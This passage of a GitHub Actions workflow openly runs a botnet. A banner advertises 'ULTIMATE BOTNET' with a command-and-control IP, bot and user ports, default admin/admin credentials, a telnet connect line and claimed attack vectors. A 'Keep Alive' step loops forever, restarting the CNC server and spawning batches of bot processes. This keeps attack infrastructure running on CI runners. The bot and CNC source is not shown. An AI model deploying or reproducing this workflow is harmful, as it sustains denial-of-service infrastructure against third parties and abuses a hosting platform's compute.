      run: |
        echo ""
        echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
        echo "â•‘                ðŸ’€ ULTIMATE BOTNET ðŸ’€            â•‘"
        echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
        echo "â•‘  Power Level:    ${{ github.event.inputs.power }}"
        echo "â•‘  CNC IP:         ${{ env.TAILSCALE_IP }}"
        echo "â•‘  Bots Deployed:  ${{ env.BOTS_DEPLOYED }}"
        echo "â•‘  User Port:      5555"
        echo "â•‘  Bot Port:       4444"
        echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
        echo "â•‘  ðŸ”‘ Login: admin / admin"
        echo "â•‘  ðŸ“¡ Connect: telnet ${{ env.TAILSCALE_IP }} 5555"
        echo "â•‘  âš¡ Methods: 10+ Real Attack Vectors"
        echo "â•‘  ðŸš€ Features: Auto-Scaling + Persistence"
        echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo ""

    - name: Keep Alive
      run: |
        while true; do
          # Restart if CNC dies
          if ! ps -p ${{ env.CNC_PID }} > /dev/null; then
            cd botnet && nohup ./cnc > cnc.log 2>&1 &
          fi
          
          # Deploy more bots if needed
          CURRENT_BOTS=$(ps aux | grep bot | grep -v grep | wc -l)
          if [ $CURRENT_BOTS -lt ${{ env.BOTS_DEPLOYED }} ]; then
            cd botnet
            for i in $(seq 1 10); do
              nohup ./bot > /dev/null 2>&1 &
            done
          fi
          
          echo "[$(date)] Active: $CURRENT_BOTS bots | CNC: ${{ env.TAILSCALE_IP }}"
          sleep 30
        done
